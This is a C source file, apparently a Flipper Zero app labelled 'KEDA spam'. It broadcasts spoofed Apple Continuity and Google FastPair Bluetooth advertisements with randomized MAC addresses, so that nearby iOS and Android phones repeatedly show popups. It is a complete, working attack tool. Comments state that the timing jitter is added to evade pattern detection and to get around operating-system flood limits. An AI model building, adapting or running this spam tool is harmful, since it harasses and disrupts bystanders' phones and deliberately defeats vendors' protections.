#include "ble_spam.h"
#include <gui/gui.h>
#include <furi_hal_bt.h>
#include <extra_beacon.h>
#include <gui/elements.h>
#include <stdlib.h>

#include "protocols/_protocols.h"

static Attack attacks[] = {
    {
        .title = "iOS and Android",
        .text = "Alternating 6s big popups",
        .protocol = NULL,
        .payload =
            {
                .random_mac = true,
                .cfg = {},
            },
    },
    {
        .title = "iOS Only",
        .text = "Big Action Modals every 6s",
        .protocol = &protocol_continuity,
        .payload =
            {
                .random_mac = true,
                .cfg.continuity =
                    {
                        .type = ContinuityTypeNearbyAction,
                    },
            },
    },
    {
        .title = "Android Only",
        .text = "FastPair Modals every 6s",
        .protocol = &protocol_fastpair,
        .payload =
            {
                .random_mac = true,
                .cfg.fastpair = {},
            },
    },
};

#define ATTACKS_COUNT ((signed)COUNT_OF(attacks))

typedef struct {
    Ctx ctx;
    View* main_view;
    bool lock_warning;
    uint8_t lock_count;
    FuriTimer* lock_timer;

    bool advertising;
    GapExtraBeaconConfig config;
    FuriThread* thread;
    int8_t index;
} State;

const NotificationSequence solid_message = {
    &message_red_0,
    &message_green_255,
    &message_blue_255,
    &message_do_not_reset,
    &message_delay_10,
    NULL,
};

NotificationMessage blink_message = {
    .type = NotificationMessageTypeLedBlinkStart,
    .data.led_blink.color = LightBlue | LightGreen,
    .data.led_blink.on_time = 10,
    .data.led_blink.period = 6000,
};

const NotificationSequence blink_sequence = {
    &blink_message,
    &message_do_not_reset,
    NULL,
};

static void start_blink(State* state) {
    if(!state->ctx.led_indicator) return;
    notification_message_block(state->ctx.notification, &blink_sequence);
}

static void stop_blink(State* state) {
    if(!state->ctx.led_indicator) return;
    notification_message_block(state->ctx.notification, &sequence_blink_stop);
}

static void randomize_mac(State* state) {
    furi_hal_random_fill_buf(state->config.address, sizeof(state->config.address));
}

static void start_targeted_beacon(State* state, const Protocol* protocol, Payload* payload) {
    uint8_t size;
    uint8_t* packet;
    GapExtraBeaconConfig* config = &state->config;

    config->min_adv_interval_ms = 100;
    config->max_adv_interval_ms = 150;

    if(payload->random_mac) randomize_mac(state);
    furi_check(furi_hal_bt_extra_beacon_set_config(config));

    if(protocol) {
        protocol->make_packet(&size, &packet, payload);
    } else {
        protocols[rand() % protocols_count]->make_packet(&size, &packet, NULL);
    }

    furi_check(furi_hal_bt_extra_beacon_set_data(packet, size));
    free(packet);
    furi_check(furi_hal_bt_extra_beacon_start());
}

static int32_t adv_thread(void* _ctx) {
    State* state = _ctx;
    start_blink(state);

    if(furi_hal_bt_extra_beacon_is_active()) {
        furi_check(furi_hal_bt_extra_beacon_stop());
    }

    uint8_t rotation_counter = 0;

    while(state->advertising) {
        Payload* payload = &attacks[state->index].payload;
        const Protocol* protocol = attacks[state->index].protocol;

        if(furi_hal_bt_extra_beacon_is_active()) {
            furi_check(furi_hal_bt_extra_beacon_stop());
        }

        if(!protocol) {
            if(rotation_counter % 2 == 0) {
                protocol = &protocol_continuity;
                payload->cfg.continuity.type = ContinuityTypeNearbyAction;
            } else {
                protocol = &protocol_fastpair;
            }

            rotation_counter++;
        }

        start_targeted_beacon(state, protocol, payload);

        // Burst broadcast with temporal jitter (250ms - 400ms) to evade pattern detection
        uint32_t burst_time = 250 + (rand() % 150);
        furi_delay_ms(burst_time);
        furi_check(furi_hal_bt_extra_beacon_stop());

        // Wait ~6 seconds total with temporal jitter to circumvent OS floodgate limits
        uint32_t sleep_time = 5600 + (rand() % 800);
        uint32_t chunks = sleep_time / 100;

        for(uint32_t i = 0; i < chunks && state->advertising; i++) {
            furi_delay_ms(100);
        }
    }

    stop_blink(state);
    return 0;
}

static void toggle_adv(State* state) {
    if(state->advertising) {
        state->advertising = false;
        furi_thread_flags_set(furi_thread_get_id(state->thread), true);
        furi_thread_join(state->thread);
    } else {
        state->advertising = true;
        furi_thread_start(state->thread);
    }
}

#define PAGE_MIN (0)
#define PAGE_MAX ATTACKS_COUNT

enum {
    PageStart = 0,
    PageEnd = ATTACKS_COUNT - 1,
};

static void draw_callback(Canvas* canvas, void* _ctx) {
    State* state = *(State**)_ctx;
    const char* back = "Back";
    const char* next = "Next";

    if(state->index == PageStart) {
        back = "";
    }

    if(state->index == PageEnd) {
        next = "";
    }

    const Attack* attack =
        (state->index >= 0 && state->index <= ATTACKS_COUNT - 1) ? &attacks[state->index] : NULL;

    canvas_set_font(canvas, FontSecondary);
    canvas_draw_icon(canvas, 4, 3, &I_ble_spam);
    canvas_draw_str(canvas, 14, 12, "KEDA spam");

    if(attack) {
        if(state->ctx.lock_keyboard && !state->advertising) {
            toggle_adv(state);
        }

        char str[32];

        canvas_set_font(canvas, FontBatteryPercent);
        snprintf(str, sizeof(str), "6.0s Paced");
        canvas_draw_str_aligned(canvas, 116, 12, AlignRight, AlignBottom, str);

        canvas_set_font(canvas, FontBatteryPercent);
        snprintf(
            str,
            sizeof(str),
            "%02i/%02i: %s",
            state->index + 1,
            ATTACKS_COUNT,
            attack->title);
        canvas_draw_str(canvas, 4, 22, str);

        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str(canvas, 4, 33, attack->title);

        canvas_set_font(canvas, FontSecondary);
        canvas_draw_str(canvas, 4, 46, attack->text);

        elements_button_center(canvas, state->advertising ? "Stop" : "Start");
    }

    if(state->index > PAGE_MIN) {
        elements_button_left(canvas, back);
    }

    if(state->index < PAGE_MAX - 1) {
        elements_button_right(canvas, next);
    }

    if(state->lock_warning) {
        canvas_set_font(canvas, FontSecondary);
        elements_bold_rounded_frame(canvas, 14, 8, 99, 48);
        elements_multiline_text(canvas, 65, 26, "To unlock\npress:");
        canvas_draw_icon(canvas, 65, 42, &I_Pin_back_arrow_10x8);
        canvas_draw_icon(canvas, 80, 42, &I_Pin_back_arrow_10x8);
        canvas_draw_icon(canvas, 95, 42, &I_Pin_back_arrow_10x8);
        canvas_draw_icon(canvas, 16, 13, &I_WarningDolphin_45x42);
        canvas_draw_dot(canvas, 17, 61);
    }
}

static bool input_callback(InputEvent* input, void* _ctx) {
    View* view = _ctx;
    State* state = *(State**)view_get_model(view);
    bool consumed = false;

    if(state->ctx.lock_keyboard) {
        consumed = true;
        state->lock_warning = true;

        if(state->lock_count == 0) {
            furi_timer_set_thread_priority(FuriTimerThreadPriorityElevated);
            furi_timer_start(state->lock_timer, 1000);
        }

        if(input->type == InputTypeShort && input->key == InputKeyBack) {
            state->lock_count++;
        }

        if(state->lock_count >= 3) {
            furi_timer_set_thread_priority(FuriTimerThreadPriorityElevated);
            furi_timer_start(state->lock_timer, 1);
        }
    } else if(
        input->type == InputTypeShort || input->type == InputTypeLong ||
        input->type == InputTypeRepeat) {
        consumed = true;

        bool is_attack = state->index >= 0 && state->index <= ATTACKS_COUNT - 1;
        bool advertising = state->advertising;

        switch(input->key) {
        case InputKeyOk:
            if(is_attack && input->type == InputTypeShort) {
                toggle_adv(state);
            }
            break;

        case InputKeyLeft:
            if(input->type == InputTypeShort || !is_attack) {
                if(state->index > PAGE_MIN) {
                    if(advertising) toggle_adv(state);
                    state->index--;
                }
            }
            break;

        case InputKeyRight:
            if(input->type == InputTypeShort || !is_attack) {
                if(state->index < PAGE_MAX - 1) {
                    if(advertising) toggle_adv(state);
                    state->index++;
                }
            }
            break;

        case InputKeyBack:
            if(advertising) toggle_adv(state);
            consumed = false;
            break;

        default:
            break;
        }
    }

    view_commit_model(view, consumed);
    return consumed;
}

static void lock_timer_callback(void* _ctx) {
    State* state = _ctx;

    if(state->lock_count < 3) {
        notification_message_block(
            state->ctx.notification,
            &sequence_display_backlight_off);
    } else {
        state->ctx.lock_keyboard = false;
    }

    with_view_model(
        state->main_view,
        State** model,
        { (*model)->lock_warning = false; },
        true);

    state->lock_count = 0;
    furi_timer_set_thread_priority(FuriTimerThreadPriorityNormal);
}

static bool custom_event_callback(void* _ctx, uint32_t event) {
    State* state = _ctx;
    return scene_manager_handle_custom_event(state->ctx.scene_manager, event);
}

static void tick_event_callback(void* _ctx) {
    State* state = _ctx;
    bool advertising;

    with_view_model(
        state->main_view,
        State** model,
        { advertising = (*model)->advertising; },
        advertising);

    scene_manager_handle_tick_event(state->ctx.scene_manager);
}

static bool back_event_callback(void* _ctx) {
    State* state = _ctx;
    return scene_manager_handle_back_event(state->ctx.scene_manager);
}

int32_t ble_spam(void* p) {
    UNUSED(p);

    GapExtraBeaconConfig prev_cfg;
    const GapExtraBeaconConfig* prev_cfg_ptr =
        furi_hal_bt_extra_beacon_get_config();

    if(prev_cfg_ptr) {
        memcpy(&prev_cfg, prev_cfg_ptr, sizeof(prev_cfg));
    }

    uint8_t prev_data[EXTRA_BEACON_MAX_DATA_SIZE];
    uint8_t prev_data_len =
        furi_hal_bt_extra_beacon_get_data(prev_data);
    bool prev_active = furi_hal_bt_extra_beacon_is_active();

    State* state = malloc(sizeof(State));

    state->config.adv_channel_map = GapAdvChannelMapAll;
    state->config.adv_power_level = GapAdvPowerLevel_6dBm;
    state->config.address_type = GapAddressTypePublic;

    state->thread = furi_thread_alloc();
    furi_thread_set_callback(state->thread, adv_thread);
    furi_thread_set_context(state->thread, state);
    furi_thread_set_stack_size(state->thread, 2048);

    state->ctx.led_indicator = true;
    state->lock_timer =
        furi_timer_alloc(lock_timer_callback, FuriTimerTypeOnce, state);

    state->ctx.notification = furi_record_open(RECORD_NOTIFICATION);
    Gui* gui = furi_record_open(RECORD_GUI);

    state->ctx.view_dispatcher = view_dispatcher_alloc();

    view_dispatcher_set_event_callback_context(
        state->ctx.view_dispatcher,
        state);
    view_dispatcher_set_custom_event_callback(
        state->ctx.view_dispatcher,
        custom_event_callback);
    view_dispatcher_set_tick_event_callback(
        state->ctx.view_dispatcher,
        tick_event_callback,
        100);
    view_dispatcher_set_navigation_event_callback(
        state->ctx.view_dispatcher,
        back_event_callback);

    state->ctx.scene_manager =
        scene_manager_alloc(&scene_handlers, &state->ctx);

    state->main_view = view_alloc();

    view_allocate_model(
        state->main_view,
        ViewModelTypeLocking,
        sizeof(State*));

    with_view_model(
        state->main_view,
        State** model,
        { *model = state; },
        false);

    view_set_context(state->main_view, state->main_view);
    view_set_draw_callback(state->main_view, draw_callback);
    view_set_input_callback(state->main_view, input_callback);

    view_dispatcher_add_view(
        state->ctx.view_dispatcher,
        ViewMain,
        state->main_view);

    state->ctx.byte_input = byte_input_alloc();

    view_dispatcher_add_view(
        state->ctx.view_dispatcher,
        ViewByteInput,
        byte_input_get_view(state->ctx.byte_input));

    state->ctx.submenu = submenu_alloc();

    view_dispatcher_add_view(
        state->ctx.view_dispatcher,
        ViewSubmenu,
        submenu_get_view(state->ctx.submenu));

    state->ctx.text_input = text_input_alloc();

    view_dispatcher_add_view(
        state->ctx.view_dispatcher,
        ViewTextInput,
        text_input_get_view(state->ctx.text_input));

    state->ctx.variable_item_list = variable_item_list_alloc();

    view_dispatcher_add_view(
        state->ctx.view_dispatcher,
        ViewVariableItemList,
        variable_item_list_get_view(state->ctx.variable_item_list));

    view_dispatcher_attach_to_gui(
        state->ctx.view_dispatcher,
        gui,
        ViewDispatcherTypeFullscreen);

    scene_manager_next_scene(
        state->ctx.scene_manager,
        SceneMain);

    view_dispatcher_run(state->ctx.view_dispatcher);

    view_dispatcher_remove_view(
        state->ctx.view_dispatcher,
        ViewByteInput);
    byte_input_free(state->ctx.byte_input);

    view_dispatcher_remove_view(
        state->ctx.view_dispatcher,
        ViewSubmenu);
    submenu_free(state->ctx.submenu);

    view_dispatcher_remove_view(
        state->ctx.view_dispatcher,
        ViewTextInput);
    text_input_free(state->ctx.text_input);

    view_dispatcher_remove_view(
        state->ctx.view_dispatcher,
        ViewVariableItemList);
    variable_item_list_free(state->ctx.variable_item_list);

    view_dispatcher_remove_view(
        state->ctx.view_dispatcher,
        ViewMain);
    view_free(state->main_view);

    scene_manager_free(state->ctx.scene_manager);
    view_dispatcher_free(state->ctx.view_dispatcher);

    furi_record_close(RECORD_GUI);
    furi_record_close(RECORD_NOTIFICATION);

    furi_timer_free(state->lock_timer);
    furi_thread_free(state->thread);
    free(state);

    if(furi_hal_bt_extra_beacon_is_active()) {
        furi_check(furi_hal_bt_extra_beacon_stop());
    }

    if(prev_cfg_ptr) {
        furi_check(furi_hal_bt_extra_beacon_set_config(&prev_cfg));
    }

    furi_check(
        furi_hal_bt_extra_beacon_set_data(prev_data, prev_data_len));

    if(prev_active) {
        furi_check(furi_hal_bt_extra_beacon_start());
    }

    return 0;
}
